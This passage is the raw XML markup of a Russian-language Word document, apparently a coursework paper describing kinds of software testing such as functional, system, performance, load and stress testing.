        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>functional</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DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0"/>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Системное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>system</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DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0"/>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 xml:space="preserve">Тестирование </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>проиводительности</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performance</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DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0"/>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Регрессионное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>regression</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DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0"/>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Модульное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>unit</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DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0"/>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Тестирование безопасности (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>security</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DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>2.2 Подробнее о видах тестирования</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Функциональное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>functional</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DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>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Проверка функциональности (тестирование методом «черного ящика») – проверка соответствия программного обеспечения требованиям, заявленным в спецификации. Может проводиться как полное тестирование заявленной функциональность, так и проверка только базовой функциональности.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>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«белого ящика» (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>white</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box</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>) Тестирование на соответствие программного продукта требованиям со знанием внутренней структуры реализации системы (есть в наличии исходный код и технические спецификации).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>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«черного ящика» (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>black</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box</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>) Тестирование на соответствие программного продукта требованиям без знания внутренней структуры реализации системы.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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функциональности может проводиться в двух аспектах:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Требования</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>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Бизнес-процессы</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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в перспективе «требования» использует спецификацию функциональных требований к системе как основу для дизайна тестовых случаев (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Test</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Cases</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">). В этом случае необходимо сделать список того, что будет тестироваться, а что нет, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>приоритезировать</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> требования на основе рисков (если это не сделано в документе с требованиями), а на основе этого </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>приоритезировать</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> тестовые сценарии (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>test</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cases</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>). Это позволит сфокусироваться и не упустить при тестировании наиболее важный функционал.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>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Тестирование в перспективе «бизнес-процессы» использует знание этих самых бизнес-процессов, которые описывают сценарии ежедневного использования системы. В этой перспективе тестовые сценарии (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>test</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scripts</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>), как правило, основываются на случаях использования системы (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>use</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>cases</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>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Преимущества функционального тестирования:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>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Имитирует фактическое использование системы;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>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lastRenderedPageBreak/>
        <w:t>Недостатки функционального тестирования:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>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Возможность упущения логических ошибок в программном обеспечении;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:num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000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Вероятность избыточного тестирования.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Системное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>system</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>testing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>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22222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">Высокоуровневая проверка функционала всей программы или </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>системыв</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> целом.</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Основной задачей системного тестирования является проверка как функциональных, так и не функциональных требований в системе в целом. При этом выявляются дефекты,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 Для минимизации рисков, связанных с особенностями поведения в системы в той или иной среде, во время тестирования рекомендуется использовать окружение максимально приближенное к тому, на которое будет установлен продукт после выдачи.</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Можно выделить два подхода к системному тестированию:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">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На базе требований (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>requirements</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based</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pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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Для каждого требования пишутся тестовые случаи (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>test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cases</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>), проверяющие выполнение данного требования.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">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На базе случаев использования (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>use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case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based</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pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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На основе представления о способах использования продукта создаются случаи использования системы (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Use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Cases</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>). По конкретному случаю использования можно определить один или более сценариев. На проверку каждого сценария пишутся тест кейсы (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>test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cases</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>), которые должны быть протестированы.</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Тестирование </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>проиводительности</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performance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ab/>
        <w:t>Тестирование, которое проводится с целью определения, как быстро работает система или её часть под определённой нагрузкой.</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Нагрузочное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>load</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Тестирование предназначено для проверки работоспособности системы при стандартных нагрузках и для определения максимально возможного пика, при котором система работает правильно.</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noProof/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-RU"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6872B63F" wp14:editId="13C68487">
            <wp:extent cx="5895975" cy="3143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5975" cy="3143250"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>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Рис. (2) Визуальное изображение теста производительности</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В зависимости от характеристик, которые нам нужно протестировать, тестирование производительности делится на типы:</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Нагрузочное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Loadtesting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>) – тестирование времени отклика приложения на запросы различных типов, с целью удостовериться, что приложение работает в соответствии с требованиями при обычной пользовательской нагрузке.</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Стресс-тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
